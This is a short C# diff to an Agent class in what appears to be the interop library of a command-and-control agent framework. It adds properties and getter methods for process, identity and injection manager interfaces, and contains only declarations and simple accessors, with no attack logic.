@@ -24,6 +24,8 @@ namespace ApolloInterop.Classes
         public ICryptographySerializer Serializer { get; protected set; }
         public IFileManager FileManager { get; protected set; }
         public IIdentityManager IdentityManager { get; protected set; }
+        public IProcessManager ProcessManager { get; protected set; }
+        public IInjectionManager InjectionManager { get; protected set; }
         public string UUID { get; protected set; }
 
         public Agent(string uuid)
@@ -68,10 +70,13 @@ namespace ApolloInterop.Classes
         public virtual IC2ProfileManager GetC2ProfileManager() { return C2ProfileManager; }
         public virtual ICryptographySerializer GetCryptographySerializer() { return Serializer; }
         public virtual IFileManager GetFileManager() { return FileManager; }
-
+        public virtual IIdentityManager GetIdentityManager() { return IdentityManager; }
+        public virtual IProcessManager GetProcessManager() { return ProcessManager; }
+        public virtual IInjectionManager GetInjectionManager() { return InjectionManager; }
         public string GetUUID()
         {
             return UUID;
         }
+
     }
 }
